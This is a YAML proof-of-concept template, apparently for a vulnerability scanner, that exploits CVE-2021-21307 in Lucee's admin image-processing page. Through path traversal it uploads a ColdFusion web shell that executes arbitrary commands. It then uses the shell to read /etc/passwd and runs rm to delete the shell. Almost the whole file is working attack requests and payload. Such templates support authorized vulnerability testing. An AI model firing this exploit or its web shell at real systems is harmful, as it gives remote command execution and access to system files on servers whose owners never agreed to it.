name: poc-yaml-lucee-cve-2021-21307-rce
manual: true
transport: http
set:
    randname: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /lucee/admin/imgProcess.cfm?file=/whatever
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: imgSrc=a
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: POST
            path: /lucee/admin/imgProcess.cfm?file=/../../../context/{{randname}}.cfm
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: "imgSrc=\r\n<cfoutput>\r\n\r\n<table>\r\n<form method=\"POST\" action=\"\">\r\n<tr><td>Command:</td><td><input type=test name=\"cmd\" size=50\r\n<cfif isdefined(\"form.cmd\")>value=\"#form.cmd#\"</cfif>><br></td></tr>\r\n<tr><td>Options:</td><td> <input type=text name=\"opts\" size=50\r\n<cfif isdefined(\"form.opts\")>value=\"#form.opts#\"</cfif>><br></td></tr>\r\n<tr><td>Timeout:</td><td> <input type=text name=\"timeout\" size=4\r\n<cfif isdefined(\"form.timeout\")>value=\"#form.timeout#\"\r\n<cfelse> value=\"5\"</cfif>></td></tr>\r\n</table>\r\n<input type=submit value=\"Exec\" >\r\n</form>\r\n<cfif isdefined(\"form.cmd\")>\r\n<cfsavecontent variable=\"myVar\">\r\n<cfexecute name = \"#Form.cmd#\"\r\narguments = \"#Form.opts#\"\r\ntimeout = \"#Form.timeout#\">\r\n</cfexecute>\r\n</cfsavecontent>\r\n<pre>\r\n#HTMLCodeFormat(myVar)#\r\n</pre>\r\n</cfif>\r\n</cfoutput> "
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: POST
            path: /lucee/{{randname}}.cfm
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: cmd=cat /etc/passwd&opts=&timeout=5
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r3:
        request:
            cache: true
            method: POST
            path: /lucee/{{randname}}.cfm
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: cmd=rm /opt/lucee/tomcat/webapps/ROOT/WEB-INF/lucee/context/{{randname}}.cfm&opts=&timeout=5
        expression: response.status == 200
    r4:
        request:
            cache: true
            method: POST
            path: /lucee/{{randname}}.cfm
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: cmd=id&opts=&timeout=5
        expression: response.status == 404
expression: r0() && r1() && r2() && r3() && r4()
detail:
    author: wupawupa
    links:
        - https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md
    vulnerability:
        id: CT-149843
        level: critical
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功